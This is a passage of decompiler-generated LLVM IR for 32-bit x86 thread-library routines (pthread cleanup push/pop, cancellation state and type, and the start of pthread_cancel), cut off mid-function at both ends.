  store i32 %v0_804dfc0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dfc5

dec_label_pc_804dfc5:                             ; preds = %dec_label_pc_804dfb4.dec_label_pc_804dfc5_crit_edge, %dec_label_pc_804dfbd
  %v0_804dfc8 = phi i32 [ %v0_804dfc8.pre, %dec_label_pc_804dfb4.dec_label_pc_804dfc5_crit_edge ], [ %v0_804dfc0, %dec_label_pc_804dfbd ]
  %v2_804dfc5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dfc5, i32* @ebx, align 4
  store i32 %v0_804df8c, i32* @esi, align 4
  store i32 %v0_804df8b, i32* @edi, align 4
  ret i32 %v0_804dfc8

; uselistorder directives
  uselistorder i32 %v3_804dfaa, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804df99, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804df8c, { 1, 0 }
  uselistorder i32 %v0_804df8b, { 1, 0 }
  uselistorder label %dec_label_pc_804dfc5, { 1, 0 }
  uselistorder label %dec_label_pc_804dfb4.loopexit, { 0, 2, 1 }
}

define i32 @__pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dfc9 = load i32, i32* @ebx, align 4
  store i32 %v0_804dfc9, i32* %stack_var_-4, align 4
  %v1_804dfcd = call i32 @thread_self.8(i32 %v0_804dfc9)
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %v1_804dfcd, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %arg1, align 4
  %v2_804dfe2 = add i32 %tmp3, 4
  %v3_804dfe2 = inttoptr i32 %v2_804dfe2 to i32*
  store i32 %arg3, i32* %v3_804dfe2, align 4
  %v0_804dfe5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dfe5 = add i32 %v0_804dfe5, 65
  %v2_804dfe5 = inttoptr i32 %v1_804dfe5 to i8*
  %v3_804dfe5 = load i8, i8* %v2_804dfe5, align 1
  %v4_804dfe5 = sext i8 %v3_804dfe5 to i32
  %v1_804dfe9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804dfe9 = add i32 %v1_804dfe9, 8
  %v3_804dfe9 = inttoptr i32 %v2_804dfe9 to i32*
  store i32 %v4_804dfe5, i32* %v3_804dfe9, align 4
  %v0_804dfec = load i32, i32* %edx.global-to-local, align 4
  %v1_804dfec = add i32 %v0_804dfec, 60
  %v2_804dfec = inttoptr i32 %v1_804dfec to i32*
  %v3_804dfec = load i32, i32* %v2_804dfec, align 4
  %v1_804dfef = load i32, i32* %ebx.global-to-local, align 4
  %v2_804dfef = add i32 %v1_804dfef, 12
  %v3_804dfef = inttoptr i32 %v2_804dfef to i32*
  store i32 %v3_804dfec, i32* %v3_804dfef, align 4
  %v1_804dff2 = icmp eq i32 %v3_804dfec, 0
  br i1 %v1_804dff2, label %dec_label_pc_804e001, label %dec_label_pc_804dff6

dec_label_pc_804dff6:                             ; preds = %entry
  %v0_804dff6 = load i32, i32* %ebx.global-to-local, align 4
  %v7_804dff6 = icmp ult i32 %v0_804dff6, %v3_804dfec
  br i1 %v7_804dff6, label %dec_label_pc_804e001, label %dec_label_pc_804dffa

dec_label_pc_804dffa:                             ; preds = %dec_label_pc_804dff6
  %v1_804dffa = add i32 %v0_804dff6, 12
  %v2_804dffa = inttoptr i32 %v1_804dffa to i32*
  store i32 0, i32* %v2_804dffa, align 4
  br label %dec_label_pc_804e001

dec_label_pc_804e001:                             ; preds = %dec_label_pc_804dff6, %entry, %dec_label_pc_804dffa
  %v0_804e001 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e001 = add i32 %v0_804e001, 65
  %v2_804e001 = inttoptr i32 %v1_804e001 to i8*
  store i8 0, i8* %v2_804e001, align 1
  %v0_804e005 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e005 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e005 = add i32 %v1_804e005, 60
  %v3_804e005 = inttoptr i32 %v2_804e005 to i32*
  store i32 %v0_804e005, i32* %v3_804e005, align 4
  %v2_804e008 = load i32, i32* %stack_var_-12, align 4
  %v2_804e00a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e00a, i32* @ebx, align 4
  ret i32 %v2_804e008

; uselistorder directives
  uselistorder label %dec_label_pc_804e001, { 2, 0, 1 }
}

define i32 @_pthread_cleanup_pop(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  %v4_804e014 = icmp eq i32 %arg2, 0
  br i1 %v4_804e014, label %dec_label_pc_804e026, label %dec_label_pc_804e01b

dec_label_pc_804e01b:                             ; preds = %entry
  %v6_804e021 = load i32, i32* %arg1, align 4
  call void @__pseudo_call(i32 %v6_804e021)
  br label %dec_label_pc_804e026

dec_label_pc_804e026:                             ; preds = %entry, %dec_label_pc_804e01b
  %v0_804e026 = phi i32 [ %tmp7, %entry ], [ 134537251, %dec_label_pc_804e01b ]
  %v1_804e026 = call i32 @thread_self.8(i32 %v0_804e026)
  %v0_804e02b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e02b = add i32 %v0_804e02b, 12
  %v2_804e02b = inttoptr i32 %v1_804e02b to i32*
  %v3_804e02b = load i32, i32* %v2_804e02b, align 4
  %v2_804e02e = add i32 %v1_804e026, 60
  %v3_804e02e = inttoptr i32 %v2_804e02e to i32*
  store i32 %v3_804e02b, i32* %v3_804e02e, align 4
  %v2_804e031 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e031, i32* @ecx, align 4
  ret i32 %v1_804e026

; uselistorder directives
  uselistorder label %dec_label_pc_804e026, { 1, 0 }
}

define i32 @_pthread_cleanup_push(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e035 = load i32, i32* @ebx, align 4
  store i32 %v0_804e035, i32* %stack_var_-4, align 4
  %v1_804e039 = call i32 @thread_self.8(i32 %v0_804e035)
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %v1_804e039, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %arg1, align 4
  %v2_804e04e = add i32 %tmp3, 4
  %v3_804e04e = inttoptr i32 %v2_804e04e to i32*
  store i32 %arg3, i32* %v3_804e04e, align 4
  %v0_804e051 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e051 = add i32 %v0_804e051, 60
  %v2_804e051 = inttoptr i32 %v1_804e051 to i32*
  %v3_804e051 = load i32, i32* %v2_804e051, align 4
  %v1_804e054 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e054 = add i32 %v1_804e054, 12
  %v3_804e054 = inttoptr i32 %v2_804e054 to i32*
  store i32 %v3_804e051, i32* %v3_804e054, align 4
  %v1_804e057 = icmp eq i32 %v3_804e051, 0
  br i1 %v1_804e057, label %dec_label_pc_804e066, label %dec_label_pc_804e05b

dec_label_pc_804e05b:                             ; preds = %entry
  %v0_804e05b = load i32, i32* %ebx.global-to-local, align 4
  %v7_804e05b = icmp ult i32 %v0_804e05b, %v3_804e051
  br i1 %v7_804e05b, label %dec_label_pc_804e066, label %dec_label_pc_804e05f

dec_label_pc_804e05f:                             ; preds = %dec_label_pc_804e05b
  %v1_804e05f = add i32 %v0_804e05b, 12
  %v2_804e05f = inttoptr i32 %v1_804e05f to i32*
  store i32 0, i32* %v2_804e05f, align 4
  br label %dec_label_pc_804e066

dec_label_pc_804e066:                             ; preds = %dec_label_pc_804e05b, %entry, %dec_label_pc_804e05f
  %v0_804e066 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e066 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e066 = add i32 %v1_804e066, 60
  %v3_804e066 = inttoptr i32 %v2_804e066 to i32*
  store i32 %v0_804e066, i32* %v3_804e066, align 4
  %v2_804e069 = load i32, i32* %stack_var_-12, align 4
  %v2_804e06b = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e06b, i32* @ebx, align 4
  ret i32 %v2_804e069

; uselistorder directives
  uselistorder label %dec_label_pc_804e066, { 2, 0, 1 }
}

define i32 @__pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e06e = load i32, i32* @ebx, align 4
  store i32 %v0_804e06e, i32* %stack_var_-8, align 4
  %v15_804e06f = ptrtoint i32* %stack_var_-12 to i32
  %v1_804e072 = call i32 @thread_self.8(i32 %v0_804e06e)
  store i32 %v1_804e072, i32* %eax.global-to-local, align 4
  store i32 %tmp4, i32* @esi, align 4
  store i32 %v1_804e072, i32* @ebx, align 4
  %v4_804e07d = icmp eq i32 %arg2, 0
  br i1 %v4_804e07d, label %dec_label_pc_804e08f, label %dec_label_pc_804e084

dec_label_pc_804e084:                             ; preds = %entry
  %v6_804e08a = load i32, i32* %arg1, align 4
  call void @__pseudo_call(i32 %v6_804e08a)
  %v0_804e08f.pre = load i32, i32* @esi, align 4
  %v1_804e092.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e08f

dec_label_pc_804e08f:                             ; preds = %entry, %dec_label_pc_804e084
  %v1_804e092 = phi i32 [ %v1_804e072, %entry ], [ %v1_804e092.pre, %dec_label_pc_804e084 ]
  %v0_804e08f = phi i32 [ %tmp4, %entry ], [ %v0_804e08f.pre, %dec_label_pc_804e084 ]
  %v1_804e08f = add i32 %v0_804e08f, 12
  %v2_804e08f = inttoptr i32 %v1_804e08f to i32*
  %v3_804e08f = load i32, i32* %v2_804e08f, align 4
  store i32 %v3_804e08f, i32* %eax.global-to-local, align 4
  %v2_804e092 = add i32 %v1_804e092, 60
  %v3_804e092 = inttoptr i32 %v2_804e092 to i32*
  store i32 %v3_804e08f, i32* %v3_804e092, align 4
  %v0_804e095 = load i32, i32* @esi, align 4
  %v1_804e095 = add i32 %v0_804e095, 8
  %v2_804e095 = inttoptr i32 %v1_804e095 to i32*
  %v3_804e095 = load i32, i32* %v2_804e095, align 4
  store i32 %v3_804e095, i32* %eax.global-to-local, align 4
  %v1_804e098 = trunc i32 %v3_804e095 to i8
  %v2_804e098 = load i32, i32* @ebx, align 4
  %v3_804e098 = add i32 %v2_804e098, 65
  %v4_804e098 = inttoptr i32 %v3_804e098 to i8*
  store i8 %v1_804e098, i8* %v4_804e098, align 1
  %v0_804e09b = load i32, i32* @ebx, align 4
  %v1_804e09b = add i32 %v0_804e09b, 66
  %v2_804e09b = inttoptr i32 %v1_804e09b to i8*
  %v3_804e09b = load i8, i8* %v2_804e09b, align 1
  %v4_804e09b = icmp eq i8 %v3_804e09b, 0
  br i1 %v4_804e09b, label %dec_label_pc_804e0b7, label %dec_label_pc_804e0a1

dec_label_pc_804e0a1:                             ; preds = %dec_label_pc_804e08f
  %v1_804e0a1 = add i32 %v0_804e09b, 64
  %v2_804e0a1 = inttoptr i32 %v1_804e0a1 to i16*
  %v3_804e0a1 = load i16, i16* %v2_804e0a1, align 2
  %v9_804e0a1 = icmp eq i16 %v3_804e0a1, 256
  %v1_804e0a7 = icmp eq i1 %v9_804e0a1, false
  br i1 %v1_804e0a7, label %dec_label_pc_804e0b7, label %dec_label_pc_804e0a9

dec_label_pc_804e0a9:                             ; preds = %dec_label_pc_804e0a1
  store i32 %v15_804e06f, i32* %eax.global-to-local, align 4
  %v2_804e0b2 = call i32 @__pthread_do_exit(i32 -1, i32 %v15_804e06f)
  store i32 %v2_804e0b2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0b7

dec_label_pc_804e0b7:                             ; preds = %dec_label_pc_804e0a1, %dec_label_pc_804e08f, %dec_label_pc_804e0a9
  %v2_804e0b7 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e0b7, i32* @ecx, align 4
  %v2_804e0b8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e0b8, i32* @ebx, align 4
  %v2_804e0b9 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e0b9, i32* @esi, align 4
  %v0_804e0ba = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804e0ba

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_804e0b7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e08f, { 1, 0 }
}

define i32 @pthread_testcancel() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_804e0be = call i32 @thread_self.8(i32 ptrtoint (i32* @0 to i32))
  %v1_804e0c3 = add i32 %v1_804e0be, 66
  %v2_804e0c3 = inttoptr i32 %v1_804e0c3 to i8*
  %v3_804e0c3 = load i8, i8* %v2_804e0c3, align 1
  %v4_804e0c3 = icmp eq i8 %v3_804e0c3, 0
  br i1 %v4_804e0c3, label %dec_label_pc_804e0dd, label %dec_label_pc_804e0c9

dec_label_pc_804e0c9:                             ; preds = %entry
  %v1_804e0c9 = add i32 %v1_804e0be, 64
  %v2_804e0c9 = inttoptr i32 %v1_804e0c9 to i8*
  %v3_804e0c9 = load i8, i8* %v2_804e0c9, align 1
  %v4_804e0c9 = icmp eq i8 %v3_804e0c9, 0
  %v1_804e0cd = icmp eq i1 %v4_804e0c9, false
  br i1 %v1_804e0cd, label %dec_label_pc_804e0dd, label %dec_label_pc_804e0cf

dec_label_pc_804e0cf:                             ; preds = %dec_label_pc_804e0c9
  %v2_804e0d1 = ptrtoint i32* %stack_var_0 to i32
  %v2_804e0d8 = call i32 @__pthread_do_exit(i32 -1, i32 %v2_804e0d1)
  br label %dec_label_pc_804e0dd

dec_label_pc_804e0dd:                             ; preds = %dec_label_pc_804e0c9, %entry, %dec_label_pc_804e0cf
  %v0_804e0e0 = phi i32 [ %v1_804e0be, %dec_label_pc_804e0c9 ], [ %v1_804e0be, %entry ], [ %v2_804e0d8, %dec_label_pc_804e0cf ]
  ret i32 %v0_804e0e0

; uselistorder directives
  uselistorder label %dec_label_pc_804e0dd, { 2, 0, 1 }
}

define i32 @__GI_pthread_setcanceltype(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp9, i32* %stack_var_-28, align 4
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804e0e1 = load i32, i32* @ebx, align 4
  store i32 %v0_804e0e1, i32* %stack_var_-4, align 4
  %v4_804e0e1 = ptrtoint i32* %stack_var_-4 to i32
  store i32 22, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_804e0ee = sext i8 %arg1 to i32
  %tmp15 = or i8 %arg1, 1
  %tmp16 = icmp eq i8 %tmp15, 1
  br i1 %tmp16, label %dec_label_pc_804e0f5, label %dec_label_pc_804e12b

dec_label_pc_804e0f5:                             ; preds = %entry
  %v1_804e0f5 = call i32 @thread_self.8(i32 %v0_804e0e1)
  store i32 %v1_804e0f5, i32* %eax.global-to-local, align 4
  %v1_804e0fa = icmp eq i32 %arg2, 0
  store i32 %v1_804e0f5, i32* %edx.global-to-local, align 4
  br i1 %v1_804e0fa, label %dec_label_pc_804e106, label %dec_label_pc_804e100

dec_label_pc_804e100:                             ; preds = %dec_label_pc_804e0f5
  %v1_804e100 = add i32 %v1_804e0f5, 65
  %v2_804e100 = inttoptr i32 %v1_804e100 to i8*
  %v3_804e100 = load i8, i8* %v2_804e100, align 1
  %v4_804e100 = sext i8 %v3_804e100 to i32
  store i32 %v4_804e100, i32* %eax.global-to-local, align 4
  %v2_804e104 = inttoptr i32 %arg2 to i32*
  store i32 %v4_804e100, i32* %v2_804e104, align 4
  %v6_804e106.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_804e10a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e106

dec_label_pc_804e106:                             ; preds = %dec_label_pc_804e0f5, %dec_label_pc_804e100
  %v2_804e10a = phi i32 [ %v1_804e0f5, %dec_label_pc_804e0f5 ], [ %v2_804e10a.pre, %dec_label_pc_804e100 ]
  %v6_804e106 = phi i32 [ %v1_804e0f5, %dec_label_pc_804e0f5 ], [ %v6_804e106.pre, %dec_label_pc_804e100 ]
  %v7_804e106 = and i32 %v6_804e106, -256
  %v8_804e106 = or i32 %v7_804e106, %v4_804e0ee
  store i32 %v8_804e106, i32* %eax.global-to-local, align 4
  %v3_804e10a = add i32 %v2_804e10a, 65
  %v4_804e10a = inttoptr i32 %v3_804e10a to i8*
  store i8 %arg1, i8* %v4_804e10a, align 1
  %v0_804e10d = load i32, i32* %edx.global-to-local, align 4
  %v1_804e10d = add i32 %v0_804e10d, 66
  %v2_804e10d = inttoptr i32 %v1_804e10d to i8*
  %v3_804e10d = load i8, i8* %v2_804e10d, align 1
  %v4_804e10d = icmp eq i8 %v3_804e10d, 0
  br i1 %v4_804e10d, label %dec_label_pc_804e129, label %dec_label_pc_804e113

dec_label_pc_804e113:                             ; preds = %dec_label_pc_804e106
  %v1_804e113 = add i32 %v0_804e10d, 64
  %v2_804e113 = inttoptr i32 %v1_804e113 to i16*
  %v3_804e113 = load i16, i16* %v2_804e113, align 2
  %v9_804e113 = icmp eq i16 %v3_804e113, 256
  %v1_804e119 = icmp eq i1 %v9_804e113, false
  br i1 %v1_804e119, label %dec_label_pc_804e129, label %dec_label_pc_804e11b

dec_label_pc_804e11b:                             ; preds = %dec_label_pc_804e113
  store i32 %v4_804e0e1, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-28, align 4
  %v2_804e124 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_804e0e1)
  store i32 %v2_804e124, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e129

dec_label_pc_804e129:                             ; preds = %dec_label_pc_804e113, %dec_label_pc_804e106, %dec_label_pc_804e11b
  %stack_var_-20.0 = phi i32 [ %tmp11, %dec_label_pc_804e106 ], [ %tmp11, %dec_label_pc_804e113 ], [ %arg2, %dec_label_pc_804e11b ]
  %stack_var_-24.0 = phi i32 [ %tmp10, %dec_label_pc_804e106 ], [ %tmp10, %dec_label_pc_804e113 ], [ %v4_804e0e1, %dec_label_pc_804e11b ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804e12b.pre = load i32, i32* %stack_var_-28, align 4
  br label %dec_label_pc_804e12b

dec_label_pc_804e12b:                             ; preds = %entry, %dec_label_pc_804e129
  %v2_804e12d = phi i32 [ %tmp11, %entry ], [ %stack_var_-20.0, %dec_label_pc_804e129 ]
  %v2_804e12c = phi i32 [ %tmp10, %entry ], [ %stack_var_-24.0, %dec_label_pc_804e129 ]
  %v2_804e12b = phi i32 [ %tmp9, %entry ], [ %v2_804e12b.pre, %dec_label_pc_804e129 ]
  %v0_804e12e = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_804e129 ]
  store i32 %v2_804e12b, i32* @edx, align 4
  store i32 %v2_804e12c, i32* @ecx, align 4
  store i32 %v2_804e12d, i32* @ebx, align 4
  ret i32 %v0_804e12e

; uselistorder directives
  uselistorder i32 %v1_804e0f5, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp11, { 2, 0, 1 }
  uselistorder i32 %tmp10, { 2, 0, 1 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 2, 3, 1 }
  uselistorder i8 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e12b, { 1, 0 }
  uselistorder label %dec_label_pc_804e129, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e106, { 1, 0 }
}

define i32 @pthread_setcancelstate(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-28, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e12f = load i32, i32* @ebx, align 4
  store i32 %v0_804e12f, i32* %stack_var_-4, align 4
  %v4_804e12f = ptrtoint i32* %stack_var_-4 to i32
  store i32 22, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_804e13c = sext i8 %arg1 to i32
  %tmp14 = or i8 %arg1, 1
  %tmp15 = icmp eq i8 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_804e143, label %dec_label_pc_804e179

dec_label_pc_804e143:                             ; preds = %entry
  %v1_804e143 = call i32 @thread_self.8(i32 %v0_804e12f)
  store i32 %v1_804e143, i32* %eax.global-to-local, align 4
  %v1_804e148 = icmp eq i32 %arg2, 0
  store i32 %v1_804e143, i32* %edx.global-to-local, align 4
  br i1 %v1_804e148, label %dec_label_pc_804e154, label %dec_label_pc_804e14e

dec_label_pc_804e14e:                             ; preds = %dec_label_pc_804e143
  %v1_804e14e = add i32 %v1_804e143, 64
  %v2_804e14e = inttoptr i32 %v1_804e14e to i8*
  %v3_804e14e = load i8, i8* %v2_804e14e, align 1
  %v4_804e14e = sext i8 %v3_804e14e to i32
  store i32 %v4_804e14e, i32* %eax.global-to-local, align 4
  %v2_804e152 = inttoptr i32 %arg2 to i32*
  store i32 %v4_804e14e, i32* %v2_804e152, align 4
  %v6_804e154.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_804e158.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e154

dec_label_pc_804e154:                             ; preds = %dec_label_pc_804e143, %dec_label_pc_804e14e
  %v2_804e158 = phi i32 [ %v1_804e143, %dec_label_pc_804e143 ], [ %v2_804e158.pre, %dec_label_pc_804e14e ]
  %v6_804e154 = phi i32 [ %v1_804e143, %dec_label_pc_804e143 ], [ %v6_804e154.pre, %dec_label_pc_804e14e ]
  %v7_804e154 = and i32 %v6_804e154, -256
  %v8_804e154 = or i32 %v7_804e154, %v4_804e13c
  store i32 %v8_804e154, i32* %eax.global-to-local, align 4
  %v3_804e158 = add i32 %v2_804e158, 64
  %v4_804e158 = inttoptr i32 %v3_804e158 to i8*
  store i8 %arg1, i8* %v4_804e158, align 1
  %v0_804e15b = load i32, i32* %edx.global-to-local, align 4
  %v1_804e15b = add i32 %v0_804e15b, 66
  %v2_804e15b = inttoptr i32 %v1_804e15b to i8*
  %v3_804e15b = load i8, i8* %v2_804e15b, align 1
  %v4_804e15b = icmp eq i8 %v3_804e15b, 0
  br i1 %v4_804e15b, label %dec_label_pc_804e177, label %dec_label_pc_804e161

dec_label_pc_804e161:                             ; preds = %dec_label_pc_804e154
  %v1_804e161 = add i32 %v0_804e15b, 64
  %v2_804e161 = inttoptr i32 %v1_804e161 to i16*
  %v3_804e161 = load i16, i16* %v2_804e161, align 2
  %v9_804e161 = icmp eq i16 %v3_804e161, 256
  %v1_804e167 = icmp eq i1 %v9_804e161, false
  br i1 %v1_804e167, label %dec_label_pc_804e177, label %dec_label_pc_804e169

dec_label_pc_804e169:                             ; preds = %dec_label_pc_804e161
  store i32 %v4_804e12f, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-28, align 4
  %v2_804e172 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_804e12f)
  store i32 %v2_804e172, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e177

dec_label_pc_804e177:                             ; preds = %dec_label_pc_804e161, %dec_label_pc_804e154, %dec_label_pc_804e169
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804e179.pre = load i32, i32* %stack_var_-28, align 4
  br label %dec_label_pc_804e179

dec_label_pc_804e179:                             ; preds = %entry, %dec_label_pc_804e177
  %v2_804e179 = phi i32 [ %tmp8, %entry ], [ %v2_804e179.pre, %dec_label_pc_804e177 ]
  %v0_804e17c = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_804e177 ]
  store i32 %v2_804e179, i32* %edx.global-to-local, align 4
  ret i32 %v0_804e17c

; uselistorder directives
  uselistorder i32 %v1_804e143, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32 (i32)* @thread_self.8, { 7, 0, 6, 4, 5, 2, 3, 1 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder i8 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e179, { 1, 0 }
  uselistorder label %dec_label_pc_804e177, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e154, { 1, 0 }
}

define i32 @pthread_cancel(i32 %arg1) local_unnamed_addr {
entry:
  %zf.global-to-local = alloca i1, align 1
  %v0_804e180 = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804e18c = urem i32 %arg1, 1024
  %v2_804e18c = icmp eq i32 %v1_804e18c, 0
  %v2_804e191 = mul nuw nsw i32 %v1_804e18c, 16
  store i1 %v2_804e18c, i1* %zf.global-to-local, align 1
  %v1_804e194 = add i32 %v2_804e191, ptrtoint (i32* @global_var_805e300.147 to i32)
  store i32 %v1_804e194, i32* @edi, align 4
  store i32 %v1_804e194, i32* @eax, align 4
  %v1_804e19c = call i32 @__pthread_lock(i32 %v0_804e180)
  %v0_804e1a1 = load i32, i32* @edi, align 4
  %v1_804e1a1 = add i32 %v0_804e1a1, 8
  %v2_804e1a1 = inttoptr i32 %v1_804e1a1 to i32*
  %v3_804e1a1 = load i32, i32* %v2_804e1a1, align 4
  store i32 %v3_804e1a1, i32* @ebx, align 4
  %v1_804e1a4 = icmp eq i32 %v3_804e1a1, 0
  store i1 %v1_804e1a4, i1* %zf.global-to-local, align 1
  br i1 %v1_804e1a4, label %dec_label_pc_804e1ad, label %dec_label_pc_804e1a8

dec_label_pc_804e1a8:                             ; preds = %entry
  %v1_804e1a8 = add i32 %v3_804e1a1, 16
  %v2_804e1a8 = inttoptr i32 %v1_804e1a8 to i32*
  %v3_804e1a8 = load i32, i32* %v2_804e1a8, align 4
  %v4_804e1a8 = load i32, i32* @esi, align 4
  %v15_804e1a8 = icmp eq i32 %v3_804e1a8, %v4_804e1a8
  store i1 %v15_804e1a8, i1* %zf.global-to-local, align 1
  br i1 %v15_804e1a8, label %dec_label_pc_804e1bd, label %dec_label_pc_804e1ad

dec_label_pc_804e1ad:                             ; preds = %dec_label_pc_804e1a8, %entry
  %v0_804e1ad = load i32, i32* @esp, align 4
  %v9_804e1ad = icmp eq i32 %v0_804e1ad, 12
  store i1 %v9_804e1ad, i1* %zf.global-to-local, align 1
  %v1_804e1b1 = inttoptr i32 %v0_804e1a1 to i32*
  %v2_804e1b1 = call i32 @__pthread_unlock(i32* %v1_804e1b1)
  br label %dec_label_pc_804e227

dec_label_pc_804e1bd:                             ; preds = %dec_label_pc_804e1a8
  %v1_804e1bd = add i32 %v3_804e1a1, 66
  %v2_804e1bd = inttoptr i32 %v1_804e1bd to i8*
  %v3_804e1bd = load i8, i8* %v2_804e1bd, align 1
  %v1_804e1c1 = add i32 %v3_804e1a1, 64
  %v2_804e1c1 = inttoptr i32 %v1_804e1c1 to i8*
  %v3_804e1c1 = load i8, i8* %v2_804e1c1, align 1
  %v12_804e1c1 = icmp eq i8 %v3_804e1c1, 1
  store i1 %v12_804e1c1, i1* %zf.global-to-local, align 1
  store i8 1, i8* %v2_804e1bd, align 1
  %v0_804e1c9 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804e1c9, label %dec_label_pc_804e1cf, label %dec_label_pc_804e1cb

dec_label_pc_804e1cb:                             ; preds = %dec_label_pc_804e1bd
  %v1_804e1cb = icmp eq i8 %v3_804e1bd, 0
  store i1 %v1_804e1cb, i1* %zf.global-to-local, align 1
  br i1 %v1_804e1cb, label %dec_label_pc_804e1da, label %dec_label_pc_804e1cf

dec_label_pc_804e1cf:                             ; preds = %dec_label_pc_804e1cb, %dec_label_pc_804e1bd
  %v0_804e1cf = load i32, i32* @esp, align 4
  %v9_804e1cf = icmp eq i32 %v0_804e1cf, 12
  store i1 %v9_804e1cf, i1* %zf.global-to-local, align 1
  %v0_804e1d2 = load i32, i32* @edi, align 4
  %v1_804e1d3 = inttoptr i32 %v0_804e1d2 to i32*
  %v2_804e1d3 = call i32 @__pthread_unlock(i32* %v1_804e1d3)
  br label %dec_label_pc_804e225

dec_label_pc_804e1da:                             ; preds = %dec_label_pc_804e1cb
  %v1_804e1da = add i32 %v3_804e1a1, 444
  %v2_804e1da = inttoptr i32 %v1_804e1da to i32*
  %v3_804e1da = load i32, i32* %v2_804e1da, align 4
  store i32 0, i32* @esi, align 4
  %v1_804e1e5 = icmp eq i32 %v3_804e1da, 0
